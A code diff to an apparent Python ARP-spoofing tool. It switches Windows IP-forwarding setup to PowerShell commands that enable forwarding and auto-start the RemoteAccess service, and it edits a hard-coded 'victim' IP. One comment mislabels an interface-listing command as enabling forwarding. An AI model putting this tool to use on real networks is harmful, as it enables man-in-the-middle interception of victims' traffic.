@@ -3,7 +3,7 @@ import argparse
 import time
 import os
 import sys
-
+import subprocess
 
 def _enable_linux_iproute():
     """
@@ -20,13 +20,19 @@ def _enable_linux_iproute():
 
 def _enable_windows_iproute():
     """
-    Enables IP route (IP Forwarding) in Windows
+    Enables IP route (IP Forwarding) on Windows using PowerShell commands
     """
-    from services import WService
+    # Enable IP forwarding
+    enable_ip_cmd = 'Get-NetIPInterface | Select-Object ifIndex,InterfaceAlias,AddressFamily,ConnectionState,Forwarding | Sort-Object -Property IfIndex | Format-Table'
+    subprocess.run(["powershell", enable_ip_cmd], capture_output=True, text=True)
 
-    # enable Remote Access service
-    service = WService("RemoteAccess")
-    service.start()
+    # Set IP forwarding to Enabled
+    set_ip_cmd = 'Set-NetIPInterface -Forwarding Enabled'
+    subprocess.run(["powershell", set_ip_cmd], capture_output=True, text=True)
+
+    # Set RemoteAccess service startup type to Automatic and start the service
+    set_service_cmd = 'Set-Service RemoteAccess -StartupType Automatic; Start-Service RemoteAccess'
+    subprocess.run(["powershell", set_service_cmd], capture_output=True, text=True)
 
 
 def _enable_macos_iproute():
@@ -109,7 +115,7 @@ def restore(target_ip, host_ip, verbose=True):
 
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.1.99"
+    target = "192.168.1.17"
     # gateway ip address
     host = "192.168.1.1"
     # print progress to the screen
